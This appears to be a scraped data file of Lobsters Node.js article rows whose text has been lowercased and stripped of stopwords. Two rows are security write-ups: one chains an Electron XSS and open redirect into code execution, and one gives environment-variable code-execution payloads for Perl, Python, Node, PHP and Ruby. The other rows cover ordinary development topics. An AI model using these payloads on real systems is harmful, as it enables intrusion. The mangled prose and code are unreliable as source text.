ctrlshifti key mashed key nothing happened appeared application removed default keyboard shortcut solve mystery searched globalshortcut electron keyboard shortcut module source code one result popped electronglobalshortcutregister commandorcontrolh activatedevmenu aha application custom keyboard shortcut open secret menu entered cmdh developer menu appeared menu bar contained number juicy item like update callback importantly devtools opened devtools resumed testing x payload soon became clear failing error message popped devtools console complaining content security policy csp violation application loading url following csp contentsecuritypolicy scriptsrc self unsafeeval http cdnheapanalyticscom http heapanalyticscom http http fastappcuescom http firebaseiocom csp excluded unsafeinline policy blocking event handler like svg payload furthermore since payload injected dynamically page using javascript typical script tag failed execute fortunately csp one fatal error allowed wildcard url particular http policy allowed include script bucket inject execute script tag dynamically used trick learned intigriti easter x challenge used iframe srcdoc attribute iframe srcdoc script srchttps script iframe anonymized source url got lovely alert box adrenaline pumping modified evilscriptjs windowrequire childprocess execfile applicationscalculatorappcontentsmacoscalculator function resent x payload nothing need go deeper room requirement heading back devtools console noticed following error uncaught typeerror windowrequire function perplexing nodeintegration set true nodejs function like require included window going back source code noticed line code creating vulnerable browserwindow const appwindow createwindow main width height webpreferences nodeintegration true preload pathjoin dirname preloadjs looking preloadjs windownoderequire require delete windowrequire delete windowexports delete windowmodule aha application renamingdeleting require preload sequence nt attempt security obscurity boilerplate code electron documentation order get third party javascript library like angularjs work mentioned previously insecure configuration consistent theme among vulnerable application turning nodeintegration reintroducing require window code execution becomes singificant possibility one tweak using windowparentnoderequire since executing x iframe sent new payload got calc driveby code execution looked native application found open redirect web application page http collabapplicationcomredirectjsp nextevilcom however triager asked demonstrate additional impact one feature native application able open new window web link browser consider application like slack zoom ever wondered open link say zoomus prompted open zoom application website trying open custom url scheme registered native application example zoom register zoommtg custom url scheme operating system zoom installed try open zoommtg zoomusstart pwdxxxx browser try prompted open native application lesssecure browser wo nt even prompted noticed vulnerable application similar function would open collaboration room native application visited page website digging code found handler function iswhitelisteddomain url var allowed collabapplicationcom var test extractdomain url allowedindexof test return true return false let launchurl parselaunchurl fullurl iswhitelisteddomain launchurl appwindowloadurl launchurl else appwindowloadurl homeurl let break native application launched custom url scheme case collabapp collabapplicationcom pwdabc url passed launch handler launch handler extract url collabapp check domain extracted url collabapplicationcom load url application window pass check whitelist checking code correct security mechanism incredibly fragile long single open redirect collabapplicationcom could force native application load arbitrary url application window combine nodeintegration vulnerability need redirect evil page call windowparentnoderequire get code execution final payload follows collabapp collabapplicationcomredirectjsp next evilhtml simply ran windowparentnoderequire childprocess execfile applicationscalculatorappcontentsmacoscalculator function victim user visit webpage load evil custom url scheme calculator pop driveby code execution without browser zerodays world live new application flourish wake pandemic developer might tempted take shortcut could lead devastating security hole vulnerability fixed quickly caused mistake early development cycle think back nodeintegration preload issue vulnerable application application always remain brittle vulnerable unless architectural configuration issue fixed even patch one x open redirect new instance bug lead code execution time turning nodeintegration would break entire application need rewritten point onwards nodejs framework like electron allow developer rapidly build native application using language tool familiar however userland vastly different threat landscape popping alert browser different popping calc application developer user tread carefully
7,Lobsters,nodejs,Node.js programming,WarsawJS Meetup #72 Online,https://www.meetup.com/WarsawJS/events/267830160/,warsawjs meetup online,,
8,Lobsters,nodejs,Node.js programming,Let's Debug a Node.js Application,https://blog.heroku.com/debug-node-applications,let debug nodejs application,listen article rely complicated cli tooling analyze core dump pino winston chrome devtools ability inspect memory take heap snapshot creating logpoints nodejs guide inspector client ndb llnode video debug trace clarify video recording julianduque,listen article always challenge come debugging application nodejs asynchronous workflow add extra layer complexity arduous process although update made engine order easily access asynchronous stack trace time get error main thread application make debugging little bit difficult well nodejs application crash usually need rely complicated cli tooling analyze core dump article take look easier way debug nodejs application course developer toolkit complete without logging tend place consolelog statement code local development really scalable strategy production would likely need filtering cleanup implement consistent logging strategy order identify important information genuine error instead implement proper logoriented debugging strategy use logging tool like pino winston allow set log level info warn error allowing print verbose log message locally severe one production also stream log aggregator endpoint like logstash papertrail even slack logging take u far understanding application working way would expect sophisticated debugging session want use breakpoints inspect code behaves moment executed use node inspect node inspect debugging tool come nodejs actually implementation chrome devtools program letting add breakpoints control stepbystep execution view variable follow call stack couple way launch node inspect easiest perhaps call nodejs application inspectbrk flag node inspectbrk yourscriptname launching program head chrome inspect url chrome browser get chrome devtools chrome devtools capability normally expect debugging javascript browser one nicer tool ability inspect memory take heap snapshot profile memory usage understand memory allocated potentially plug memory leak rather launching program certain way many modern ides also support debugging node application addition many feature found chrome devtools bring feature creating logpoints allowing create multiple debugging profile check nodejs guide inspector client information ides another option install ndb standalone debugger nodejs make use devtools available browser isolated local debugger also extra feature nt available devtools support editinplace mean make change code updated logic supported directly debugger platform useful quick iteration suppose application crash due catastrophic error like memory access error may rare happen particularly app relies native code investigate sort issue use llnode program crash llnode used inspect javascript stack frame object mapping object cc side order use first need core dump program need use processabort instead processexit shut process code use processabort node process generates core dump file exit better understand llnode provide video demonstrates capability aside also thirdparty package recommend debugging first called simply enough debug debug assign specific namespace log message based function name entire module selectively choose message printed console via specific environment variable example nodejs server logging several message entire application middleware stack like sequelize express application express router set debug environment variable express router start program message tagged express router shown filtering message way hone single segment application behaving without needing drastically change logging code two module go together trace clarify trace augments asynchronous stack trace providing much detailed information async method called roadmap nodejs provide default clarify help removing information stack trace specific nodejs internals allows concentrate function call specific application neither module recommended running production enable debugging issue local development environment like follow along use debugging tool practice video recording provides detail includes live demo narrow problem code question find twitter julianduque
9,Lobsters,nodejs,Node.js programming,Hacking with Environment Variables,https://www.elttam.com/blog/env/,hacking environment variable,introduction remote ldpreload exploitation perl exploit hacker fantastic blasty exploit solve ctf challenge justinsteven proof concept python making progress pythonwarnings guarded check variable antigravity module easter egg leveraging perl arbitrary code execution proof concept nodejs blog post michał bentkowski proc filesystem proof concept php php setting orange tsai great blog post brendan scarvell proof concept ruby proof concept conclusion,introduction recent project gained ability specify environment variable process executed also unable control content file disk bruteforcing process identifier pid file descriptor found interesting result eliminating remote ldpreload exploitation fortunately scripting language interpreter executed enabled u execute arbitrary command specifying particular environment variable blog post discus arbitrary command executed range scripting language interpreter supplied malicious environment variable perl quick read environment section perlrun man page reveals plenty environment variable worth investigating environment variable allows specifying commandline option restricted accepting option cdimtuwdmtw unfortunately mean e allows supplying perl code run lost though demonstrated exploit hacker fantastic exploit writes malicious perl module tmprootpm supply environment variable achieve arbitrary code execution however exploit local privilege escalation vulnerability generic technique ideally require access file system looking blasty exploit cve exploit require creating file used environment variable sh exit environment variable also used solve ctf challenge one final nicety generic technique would use single environment variable instead two justinsteven found possible leveraging either used load perl module option allows adding extra code module name proof concept arbitrary code execution achieved using environment variable perl running empty script devnull docker run env print id perl devnull root root root python reading environment variable section python man page pythonstartup initially appears like may piece straightforward solution allows specifying path python script executed prior displaying prompt interactive mode interactive mode requirement seem like would issue pythoninspect environment variable used enter interactive mode specifying command line however documentation option explains pythonstartup used python started script execute mean pythonstartup pythoninspect combined pythonstartup effect python repl immediately launched ultimately mean pythonstartup viable effect executing regular python script environment variable looked promising pythonhome pythonpath let gain arbitrary code execution require also able create directory file filesystem may possible loosen requirement use proc filesystem andor zip file majority remaining environment variable simply checked contain nonempty string toggle generally benign setting one rare exception pythonwarnings making progress pythonwarnings documentation pythonwarnings state equivalent specifying w option w option used warning control specify warning often printed full form argument action message category module line warning control seem like promising lead quickly changed checking implementation def getcategory category category return warning category import builtins klass category else module klass categoryrpartition try import module none none klass except importerror raise optionerror invalid module name r module none code show long specified category contains dot trigger import arbitrary python module next problem vast majority module python standard library run little code imported tend define class used later even provide code run code typically guarded check main variable detect file imported run directly unexpected exception antigravity module python developer included easter egg triggered running import antigravity import immediately open browser xkcd comic joked import antigravity python would grant ability fly antigravity module open browser us another module standard library called webbrowser module check path large variety browser including mosaic opera skipstone konqueror chrome chromium firefox link elinks lynx also accepts environment variable browser let specify process executed possible supply argument process environment variable xkcd comic url one hardcoded argument command ability turn arbitrary code execution depends executables available system leveraging perl arbitrary code execution one approach leverage perl commonly installed system even available standard python docker image however perl binary used first argument xkcd comic url comic url argument cause error process exit without environment variable used effect url passed perl docker run e print id exit perl http ca nt open perl script http file directory fortunately perl available also common default perl script available perldoc perlthanks script also error exit invalid argument error case happens later processing environment variable mean leverage perl environment variable payload detailed earlier blog post working intended perldoc perlthanks docker run e print id exit perldoc http root root root run e print id exit perlthanks http root root root proof concept arbitrary code execution achieved using multiple environment variable python python docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx nodejs blog post michał bentkowski provided payload exploiting kibana prototype pollution vulnerability used set arbitrary environment variable resulted arbitrary command execution michał payload used nodeoptions environment variable proc filesystem specifically procselfenviron although michał technique creative worked perfectly vulnerability technique always guaranteed work constraint would nice remove first constraint using procselfenviron viable content made syntactically valid javascript requires able create environment variable appear first content procselfenviron knowingbruteforcing environment variable name appear first overwriting value another constraint first environment variable value finish single line comment therefore newline character environment variable likely cause syntax error prevent payload executing use multiline comment fix issue must closed syntactically valid therefore rare case environment variable contains newline character required knowbruteforce environment variable name overwrite value new value contain newline removing contraints exercise left reader proof concept achieving arbitrary code execution environment variable nodejs michał bentkowski docker run e nodeversionconsolelog require childprocess execsync id tostring e nodeoptions require procselfenviron node devnull root root root php run ltrace e getenv php devnull find php us phprc environment variable environment variable used attempting find load configuration file phpini exploit neex used series php setting achieve arbitrary code execution orange tsai also great blog post creating exploit cve us slightly different list setting using knowledge plus knowledge gained previous nodejs technique help brendan scarvell two environment variable solution found php constraint exist technique nodejs example proof concept achieving arbitrary code execution environment variable php docker run e nautoprependfileprocselfenvironn php die id e phprcprocselfenviron php devnull autoprependfileprocselfenviron root root root ruby generic solution ruby found yet ruby accept environment variable rubyopt specify commandline option man page state rubyopt contain e k r u v w w debug disablefeature enablefeature promising option r cause ruby load library using require however limited file extension rb example somewhat useful rb file found toolsserverrb json gem available installing ruby fedora system file required web server started shown using rubyopt environment variable cause ruby process start web server docker run env binbash c dnf install ruby devnull ruby devnull surf http info webrick info ruby info webrick httpserver start sticking fedora another approach leverage fact usrbinruby actually bash script start usrbinrubymri script call bash function overwritten environment variable proof concept using exported bash function run arbitrary command docker run env bashfuncdeclare id exit binbash c dnf install ruby devnull ruby devnull root root root conclusion post explored interesting use case environment variable could assist achieving arbitrary code execution various scripting language interpreter without writing file disk hopefully enjoyed reading inspired find share improved payload scripting language find generic technique work ruby would interested hearing achieved thanks reading ciao bella
10,Lobsters,nodejs,Node.js programming,BashoJS: JavaScript Evaluator for Shell Scripts,https://bashojs.org/,bashojs javascript evaluator shell script,lazy javascript evaluator shell script basic lazy evaluation piping result quoting expression lazy evaluation exit condition shell command importing j file array map filter flatmap reduce argument reusable expression subroutine named expression seeking combining expression recursion promise logging error handling real world example document complex command document bracket basho recipe http bashojsorgrecipes http githubcombashojsbashorecipes jeswin agilehead,lazy javascript evaluator shell scriptsbasho let write complex shell task using plain javascript mix well shell command script choose best tool jobinstall basho firstif npm use npx command try basho without installingbasics basho evaluates pipeline instruction left right instruction javascript code reference external j file shell command make basho interesting lazy evaluation laterto evaluate javascript expression use option j let start single item pipeline javascript constantcopybasho j basho j true basho j option j omitted first expressionthe option p avoids printing final result sure need use thereworking string need quoting since bash chew quote need use single quote around double quotespiping result pipe expression subsequent expression variable x always used placeholder receiving previous inputcopybasho j x j expression expression space important quote following example see x quotedcopybasho j x j x expression contains bash special character necessary quote following example expression quote since bash redirection operatorcopybasho j x j x best practice wise quote expression except maybe trivially simple lazy evaluation exit condition may choose terminate pipeline option condition met since pipeline lazy expression bash command evaluatedcopybasho x j x command execute shell command e option shell command expanded j template string variable x holding input preceding command pipeline remember quote escape character hold special meaning shell etctip single quote far easier work since double quote try expand variable inside itcopybasho e echo x extend pipeline shell command shell command output becomes input next commandcopybasho j x e echo x j parseint x e echo x basho receive input via stdin always x represents inputcopyecho basho parseint x pipe multiline output commandscopyls al basho f xincludes git nothing stopping piping basho output eithercopybasho j x xargs echoimporting j file import function j file npm module import option import option take two parameter filename module name alias import import available subsequent expression throughout pipelinecopymoduleexports function square n return n basho import squarejs sqr j sqr x basho import squarejs sqr j sqr x j j sqr x array map filter flatmap reduce input expression array subsequent expression command executed item array equivalent map functioncopybasho e echo x input also object expand template stringcopybasho name jes age e echo xname xage use array objectscopybasho name kai name niki e echo xname array array surecopybasho e echo x x x command choose receive entire array optioncopybasho j xlength e echo x filter array f optioncopybasho f x e echo x reduce r option first parameter lambda second parameter initial value accumulatorcopybasho r accx e echo x also flatmap optioncopybasho flatmap used flatten array array wellbtw could also access array index template literal variable lambda shell command templatescopybasho b c e echo x argument reusable expression sometimes want pas additional argument reuse expression multiple time pipeline define expression option get stored field variable named k see usage belowhere use define option pas argumentscopybasho divisor j use reusable expressionscopybasho x j x used shell command well remember quote thoughcopybasho echocmd echo e kechocmd n x subroutine subroutine minipipelines within parent pipeline allows u define set operation could repeatedly called itemsubroutines defined sub option followed name sub sub continues till endsub found sub stored subsequent usage variable kcopybasho sub multiply x j x endsub j kmultiply x nested subroutine surecopybasho sub multiply sub square x x endsub j x j ksquare x endsub j kmultiply x named expression seeking combining expression n option give name result expression recall later seek c combine optionscopy print instead j x j n j x j option allows seek named resultcopy return basho j n j n c option allows combinemultiplex stream sequence arrayscopy return basho j n j n c g option allows recurse previous named expression take two parameter expression name predicate stop recursionhere expression keep recursing adding till exceeds print j n g x powerful instance along promise sleep specified time recursion use used periodically run command usage left reader exercisepromises j expression evaluates promise resolved passing next command pipelinecopybasho promiseresolve e echo x basho import nodefetch fetch j fetch http oaksnvgorgbashohtml e echo x logging add l option anywhere pipeline print current valuecopybasho l x j x e echo x w option thing without newlinecopybasho w x j x e echo x error handling handle error error option choose return arbitrary value place unhandled pipeline terminated immediately following example xsplit result exception second input since number split method error handler expression replaces exception string skippedcopybasho b c j xsplit error skipped first argument basho ignoreerror basho exit error simply move next itemcopybasho ignoreerror b c j xsplit printerror option work like ignoreerror print errorcopybasho printerror b c j xsplit note ignoreerror printerror must preceded option except import optionreal world example count number occurences word line textcopyecho hello world hello hello basho j xmatch hellog lengthrecursively list typescript filescopyfind basho f xendswith t count number typescript filescopyfind basho f xendswith t xlengthget weather bangalorecopyecho bangalore basho import nodefetch fetch fetch http q x appidyourapikey unitsmetric j xjson j xmaintempwho wrote harry potter philosopher stone copybasho import nodefetch fetch fetch http j xjson j xitems volumeinfoauthorsfind git hosted sub directory might need pullcopyls basho xsplit x n dirname e cd x git remote update git status f xsome branch behindtest dirnamefind git hosted sub directory need pushed remotecopyls basho xsplit x n dirname e cd x git status f xsome nothing committest xsome branch uptodatetest dirnamecheck basho version least basho v basho xsplit j parseint x parseint x parseint x ok bashoversion ok echo good format universe else echo install basho version higher fihere document complex command complex command require lot quoting make code ugly fortunately shell feature called document hugely simplifies use case pretty much avoid quoting note need specify argument separate line help readability well invoking basho remember use quote around variable see example indentation ignored use formattingcopybashocmd cat eofj hello world j xsplit eof basho bashocmd asterisk nt get substituted need substitution use eof instead eof bracket better legibility multiline command bracket help line containing opening closing bracket contain nothing else example bracket nestedcopybashocmd cat eofj x x x eof basho bashocmd basho recipe work progress see real world example http bashojsorgrecipes contribute recipe fork http githubcombashojsbashorecipes send pull requestabout basho developed jeswin sponsored agilehead software mit license freely use commercial work without restrictionsthat typing basho without parameter nothing might make happy reflective course original purpose app
11,Lobsters,nodejs,Node.js programming,danburzo/hred: reduce HTML to JSON from the command line,https://github.com/danburzo/hred,danburzohred reduce html json command line,hred h red qsx query qsx documentation installation usage concatenated json record reallife example starred repos page note security jsdom script execution disabled default related project pup xray gdom tq,hred hred html reduce commandline tool extract data html read html stdin output stdout json produced qsx query curl http danburzoro hred li href textcontent href textcontent dan burzo qsx documentation describes kind query make hred familiar cs selector mostly good go installation hred run nodejs find hred npm registry install globally npm npm install g hred install globally yarn yarn global add hred run without installing npx hred usage hred accepts qsx query string curl http enwikipediaorgwikibanana hred img alt src alt page semiprotected src alt banana cross sectionjpg src hred single modest purpose extracting part html json qsx query language lightweight extension cs selector syntax used elementqueryselectorall dom method hred offer limited reshaping resulting json via alias tool designed piped something like jq json processing necessary hred option available option description c concat result array return concatenated json record make easier collate several result together h help print help message r raw complement c return raw unquoted string result array string u url url url add base url html evaluated influence value dom property href src html attribute relative v version display current version x xml parse input xml rather html reallife example let take web page us atomic presentational cs rather semantic cs class thus make challenging extract data starred repos page extract info repository time writing curl http githubcomdanburzo tabstars hred href url textcontent title scope textcontent description let break query apart element class one hand find element nested read href html attribute url textcontent dom property title merge resulting object current scope hand find first subsequent element scope match class extract textcontent description resulting json abridged url urfavecli title n urfave clin description n n simple fast fun package building command line apps gon n note security hred us jsdom dom provider although used sole purpose parsing html querying resulting dom script execution disabled default always good idea mindful feeding untrusted html world wide web hred related project might interested pup original jq html xray concept including html attribute query string gdom qsx look bit like graphql maybe graphql dom thing tq another popular cli tool extracting data html
12,Lobsters,nodejs,Node.js programming,Kretes in 5 minutes - A full-stack TypeScript tutorial with Node.js & PostgreSQL,https://www.youtube.com/watch?v=BfcwZgPHwKk,kretes minute fullstack typescript tutorial nodejs postgresql,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature kretes minute fullstack typescript tutorial nodejs vuejs postgresql youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature kretes minute fullstack typescript tutorial nodejs vuejs postgresql youtube
13,Lobsters,nodejs,Node.js programming,Dates and Times in JavaScript – A new Temporal API from TC39,https://blogs.igalia.com/compilers/2020/06/23/dates-and-times-in-javascript/,date time javascript new temporal api,tl dr looking feedback temporal proposal try polyfill complete survey use production yet maggie pint twopart blog post fixing javascript date cookbook proposal try temporal api documentation open browser console runkit polyfill give feedback survey issue tracker temporal champion group process document,tl dr looking feedback temporal proposal try polyfill complete survey use production yet javascript date broken way fixed without breaking web story go included original javascript engine hack based javautildate deprecated due terrible api replaced better one result javascript history builtin date remained hard work directly starting year ago proposal developing add new globally available object javascript temporal temporal robust modern api working date time timestamps also make easy thing hard impossible date like converting date time zone adding subtracting accounting daylight saving time working dateonly timeonly data even handling date nongregorian calendar although temporal work default also provides finegrained optin control overflow interpreting ambiguous time corner case history proposal possible fix date read maggie pint twopart blog post fixing javascript date example power temporal check cookbook many example would difficult legacy date particularly one involving time zone would put example post code might soon become stale reason hopefully become clear proposal currently stage proposal process hoping move along stage working feature set temporal api long time believe fullfeatured api reasonable design good apis solely drawing board however time put test let javascript developer community try see whether come meet people need still early enough make drastic change api find need based feedback get please try let u know try temporal want try temporal casually interactive prompt easy visit api documentation browser documentation cookbook page open browser console temporal already loaded ready try example try runkit maybe interested bit indepth evaluation like building small test project using temporal know take people valuable project time also best way get valuable feedback really appreciate released polyfill temporal api npm use project npm install save proposaltemporal import project const temporal require proposaltemporal however use polyfill production application proposal still stage polyfill version make clear api subject change intend keep changing get feedback give feedback would love hear experience temporal tried short survey fill feel comfortable please leave u contact information since might want ask follow question please also open issue issue tracker suggestion welcome suggestion whether filled survey also browse feedback already given issue tracker give thumbsup agree thumbsdown disagree thanks participating feedback receive help u make right decision proposal move along stage temporal eventually appears browser post mean temporal champion group group delegate interested people may guess blog post hosted includes member igalia compiler team written behalf temporal champion read process document information stage mean tl dr stage time give feedback proposal still incorporated even requires drastic change stage proposal remains stable except serious problem discovered implementation browser
14,Lobsters,nodejs,Node.js programming,How many AWS services do you need to host a static webpage? (2/2),https://medium.com/warsawjs/how-many-aws-services-do-you-need-to-host-a-static-webpage-2-2-aa619fc99fc2,many aws service need host static webpage,show code awsconfigupdate region export await dynamogetitem tablename key promise updateexpression set c counter c counter counter counter returnvalues updatednew attribute,show code mentioned write lambda logic using nodejs used version runtime also choose node recentlywhat nice version use asyncawait returned response body thrown caught cause error responseconst aws require awssdk const doc require dynamodbdoc awsconfigupdate region const dynamo new docdynamodb const tablename table const key id exportsbumpcounter async event context const item counter await dynamogetitem tablename key promise return statuscode body jsonstringify await dynamoupdateitem tablename key updateexpression set c counter expressionattributenames c counter expressionattributevalues counter counter returnvalues updatednew promise attribute beginning snippet import use aws mechanism sure everything happens region choice set beginning awsconfigupdate functionwhat exported lambda async function consumes parameter event triggered lambda http request detail lambda context context eg variable defined configuring lambdathen use dynamodb client work await thanks promise method personally found expression thing updateitem confusing beginning update expression like set counter counter problematic counter reserved dynamodb keyword problem value passed like therefore used template mechanism client alias alias table column alias valueit worth setting returnvalue updatednew get response changed database column accessing attribute response give u exactly thatin case error rely cloudwatch found really helpful together plain ol consolelogto super safe come cost set number possible parallel lambda
15,Lobsters,nodejs,Node.js programming,How to build an automated DIY irrigation system controlled by an app,https://blog.usejournal.com/automated-smart-home-irrigation-system-9061c391f8e2,build automated diy irrigation system controlled app,part list hardware architecture software architecture mern stack nodejs expressjs mongo database react rest setup nodemcu video installing project raspberry pi github http githubcompatrickhallekautomatedirrigationsystemgit http getdockercom,article show build affordable automated irrigation system longer water plant hand system used house plant raised bed also plant garden larger green area number connected plant scalablehere decision irrigate made according timer rather soil moisture measured directly decision made basis whether irrigation necessary notwant read story later save journalthe system following feature controlled via web app monitor display time series data minute hour day week month levelssetting water level automatic watering triggeredsetting long pump work irrigationmanual activation irrigation buttonswitching different sensor profilesswitching dark light themepart list product link also affiliate link exactly product bought system order via link receive tiny commissionthe n amount due number pump different plant example raised bed usually sufficient one pump one sensor however different potted plant need watered separately therefor get one pump sensor potted planthardware architectureto measure soil moisture nodemcu microcontrollers read analog signal capacitive sensor filtered interpolated measured value sent local network raspberry pi decide whether trigger relay associated sensor relay opened circuit pump closed plant get wateredthe architecture chosen pump logic recording measurement data separate make possible control pump raspberry pi amount default available gpio pin also possible read analog signal capacitive sensor raspberry raspberry process digital signal surely possible read sensor serial interface requires pin setup clean used pump also separately connected power supply whose circuit controlled relay also possible use higher pumpssoftware architecturefor software architecture mern stack used software consists nodejs backend expressjs mongo database react frontend c script run nodemcu sends data rest interface backend data processed backend decided whether irrigate addition data stored mongodb frontend data also requested backend via restsetup nodemcu record measurement data sensor nodemcu must first install software order flash nodemcu microcontroller follow step described videobefore upload program set wifi password wifi name ssid ip raspberry pi host sensor name name need unique sensor name name displayed app best choose name plant sensor associated withif arduino ide successfully configured nodemcu upload program find repository nodemcuinstalling project raspberry pifirst download software raspberry pi find source code github following command downloads repository onto raspberry pi git clone http githubcompatrickhallekautomatedirrigationsystemgitcd automatedirrigationsystemto avoid install required program manually also run application docker container carry following step curl ssl http getdockercom shsudo usermod ag docker pisudo aptget install libffidev libssldevsudo aptget install aptget remove pythonconfigparsersudo install dockercomposenow pas ip address pi reactappbackendurlhttp yourraspiip environment variable dockercompose file sudo nano dockercomposeymlyou find ip command ifconfig something like save input nano editor ctr x type yes finally exit enternow everything ready start application following command sudo dockercompose upattention raspberry pi processor need adjust image mongodb dockercompose file since version image suitable type processorto run software startup execute following command systemctl start dockerservice
16,Lobsters,nodejs,Node.js programming,Evolution of the precise code intel backend,https://about.sourcegraph.com/blog/evolution-of-the-precise-code-intel-backend,evolution precise code intel backend,sourcegraphcom private instance sourcegraph sourcegraph browser extension motivation srclib srclib lsif mvp express sourcegraph extension optimizing query sqlite dgraph badgerdb change processing uploads asynchronously noderesque resque ipc pr storing crossrepository data postgresql dblink eventually reverted queue bull redis bull search within job payload text matching query queue postgresql adding graphql resolvers sourcegraphgo sourcegraphtypescript campaign code insight diagnostics introducing multiple worker container prefork sourcegraphcom headofline blocking introducing bundle manager rewriting go strangler fig optimizing code intelligence backend removing lsifserver looking forward,jumping definition symbol cursor finding reference two basic mental mechanic software engineering fast code navigation accelerates rate build mental model code available likely use hundred thousand time per day code navigation core sourcegraph help understand part universe code relevant important code navigation also present difficult technical challenge especially want provide code navigation outside ide variety application developer trying understand code webbased code search engine like sourcegraphcom private instance sourcegraph code host like github gitlab bitbucket phabricator sourcegraph browser extension order provide compileraccurate code navigation ides work lot magic behind scene involves static analysis incremental compilation build execution lot lot caching much assumes read write exec permission local filesystem sourcegraph provide precise code navigation user within millisecond without access answer language server index format lsif elsif post share technical journey lsif including chose adopt foundation precise code navigation challenge faced scaling lsifbased backend see thing going motivation journey lsif began first version sourcegraph precise code navigation firstorder concern even early version application time code navigation feature available editor certain language editor depending whether plugin added support specific language specific editor enable code navigation webbased interface eye toward enabling across language editor sourcegraph created srclib first opensource crosslanguage code analysis toolchain indexing format project like language server protocol kythe still year away released srclib worked quite well early version sourcegraph however adding srclib indexer every language turned quite undertaking many product feature demanded time attention support new language slow develop meantime language server protocol emerged new open protocol providing code navigation across many editor lsp piggybacked growing traction v code many implementation lsp emerged major language growing ecosystem sourcegraph saw opportunity take advantage also give back emerging opensource community dedicated making code intelligence ubiquitous every language contributed language server implementation go typescript javascript python java incorporated language server application architecture could deployed sourcegraph provide precise code intelligence many language able provide srclib limited developerhours language server served user well number year eventually amount code sourcegraphcom grew large organization began adopt sourcegraph big internal codebases scaling performance became issue fast forward early largest customer began regularly reporting language server outage related high usage volume large codebase size began looking way improve performance scale started thinking combine richness lsp ecosystem performance indexingbased approach like srclib february surprise delight dirk bäumer one creator lsp announced language server index format lsif code intelligence indexing format similar spirit lsp lsif lsif provides crosslanguage serialization format describes data needed quickly resolve action like gotodefinition findreferences raw lsif data json look like id type vertex label definitionresult id type edge label textdocumentdefinition outv inv id type edge label item outv invs document id type vertex label packageinformation name githubcomsourcegraphsourcegraph manager gomod version sourcegraph accepts useruploaded lsif data generated lsif indexer implementation local checkout code common scenario step repository ci pipeline sourcegraph receives data transforms internal format optimized scale query speed sourcegraph us data power local repository crossrepository code navigation action like gotodefintion findreferences today sourcegraph lsif backend multiple component handle aspect uploading parsing transforming reading writing manipulating lsif data serve user request story system grew evolved time story span commits line code mvp lsif backend began life simple express server written typescript proxied outside world endpoint sourcegraph frontend api server accepted lsif uploads wrote directly disk query request server would read lsif data current repository disk memory parse structured representation walk graph vertex edge construct appropriate response client side wrote simple sourcegraph extension query lsifserver api chose typescript express fastest way get something running given experience team primary goal solicit feedback user ergonomics upload api user would configure ci pipeline generate lsif basic user experience code navigation backed lsif performance scalability robustness code quality primary concern optimizing query serve query mvp implementation would simply read raw lsif data disk memory parse structured representation walk graph compute query result lsif index however large larger size codebase given revision larger codebases added significant latency serving user request would often also call oom crash needed make following operation fast get definition identifier given source position get reference identifier given source position get hover text identifier given source position order decided store lsif data different format optimized operation several design discussion reduced choice two option sqlite embedded filebased sql database engine dgraph distributed graph database built top lsmtreebased database badgerdb built two version backend benchmark showed upload performance sqlite dgraph backends proportional input size sqlite factor dgraph factor relatively inexperienced dgraph relatively slow performance could explained lack operational experience bad choice graph schema dgraph backend implementation found time might experimented dgraph decided go sqlite based higher initial performance familiarity using past fact would easier deploy operationally many deployment environment customer change query needed read disk document containing target source range instead lsif dump entire repository processing uploads asynchronously mvp lsif upload process synchronous acceptable mvp reading lsif data network writing directly disk adopting sqlite backend store precise code navigation added additional transformation step lsif upload process rather simply read lsif data network write directly disk parse data convert sqlite bundle increased lsif upload response time significantly began bumping timeouts enforced various client server proxy within around sourcegraph also started see frequent oom error lsifserver process larger uploads data conversion process also increased memory usage process handled uploads query uploading large file multiple small one parallel could ooming process also take code navigation query address issue decided separate work converting lsif sqlite bundle separate background process lsifserver process would continue handle uploads query uploads handler would similar mvp implementation transparently writing raw data disk rather converting synchronously lsifworker process would consume queue lsif dump process converting sqlite bundle background coordinate work lsif upload handler lsifworker process needed queue used noderesque nodejs port popular rail library resque library store job data redis already component stack also considered using postresql accessing existing postgresql instance came certain restriction due concern uptime performance sort local ipc would prevented scaling lsifserver lsifworker independently using amqp server would required introducing new major service architecture implemented splitting lsifserver lsifworker pr storing crossrepository data postgresql uploaded lsif index became single sqlite database ondisk singlerepository database would sufficient support local within repository code navigation order make code navigation experience truly seamless magical wanted support crossrepository code navigation word wanted user click reference function defined dependency arrive directly definition function source repository pretty neat enable added additional sqlite database xrepodb enabled u look repository index versioned package provided version package depended fine long one instance lsifserver lsifworker lived docker container however order support lsif across large multirepository codebases needed scale meant multiple lsifserver lsifworker instance would running different docker container perhaps different machine could longer rely share access singlewriteratatime sqlite database moved xrepodb data postgresql potential volume additional writes continued concern u lsif use grew would cause operational issue postgresql instance would affect performance unrelated part application safe kept table space lsif data disjoint prefixed table name foreign key existing table data also tried migrating lsif table second postgresql instance however required nasty trickery dblink order run migration found quite painful eventually reverted backoftheenvelope calculation suggested lsifrelated load would nt overwhelm single shared postgresql instance calculation largely held time queue bull redis saw operational issue related stuck worker lost job traced back queueing library noderesque motivated switch bull also additional feature allowed u schedule job similar spirit cron list job particular state search within job payload text matching query using redis eval command relevant pr queue postgresql adoption bull resolved issue queue implementation others remained particular problem enforcing logical transaction across data stored partially redis partially postgresql particular data could written postgresql indicating successful completion lsif bundle conversion corresponding job queue stored redis could updated within transaction sometimes got sync furthermore redis treated part sourcegraph ephemeral truncatable cache site administrator aware felt could safely wipe redis data would wreak havoc lsif processing queue address issue moved queue data redis postgresql reduced lot complexity turned custom lua script reached redis data could reduced sql query could also use postgresql transaction enforce allornothing atomicity lsifrelated update adding graphql resolvers lsifserver accessible undocumented proxy sourcegraph frontend service proxy accepted uploads served code navigation query consumer api firstparty sourcegraph extension like sourcegraphgo sourcegraphtypescript adding graphql api enabled lsif backend used part sourcegraph nascent campaign feature currently inprogress code insight also thirdparty sourcegraph extension author thirdparty api consumer functionality lsif backend continues grow recently added support diagnostics possibility user api introducing multiple worker lsifserver lsifworker still run together container easy way enable multiple worker without changing container orchestration decided prefork worker rudimentary way scale overall resource use still constrained single container isolation worker process meaning runaway memory use one starve others container worked well enough time change also helped u resolve issue lsif processing sourcegraphcom suffering headofline blocking introducing bundle manager needed enable lsifserver lsifworker instance scale horizontally time instance shared access persistent storage would store lsif data used serve query naively thought might possible simply attaching shared disk separate instance practice however issue kubernetes persistent volume default mounted readwritemany across 